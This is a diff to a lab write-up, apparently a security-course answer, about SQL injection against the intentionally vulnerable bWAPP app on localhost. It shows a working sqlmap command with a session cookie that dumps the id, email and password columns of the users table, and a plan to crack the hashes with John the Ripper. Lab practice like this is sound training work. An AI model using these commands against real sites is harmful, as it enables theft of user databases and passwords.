@@ -40,10 +40,20 @@ python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=4" -users --cookie="
 
 ![users](imgs/all_users.png)
 
-So now I have all the table and user accounts on bWAPP.
+So now I have all the table and users on bWAPP.
 
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
 
+- I will export id, email, password data on users table
 
+```
+python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=4" -D bWAPP -T users -C id,email,password --dump --columns --cookie="PHPSESSID=rg31vtuuuqt0s0vh272rrecg14;security_level=0"
+```
+
+- The output is:
+
+![iep](iep.png)
+
+- I will copy 2 hashed password inside the csv file of sqlmap to a txt file. Then use John the Ripper to crack them.
 
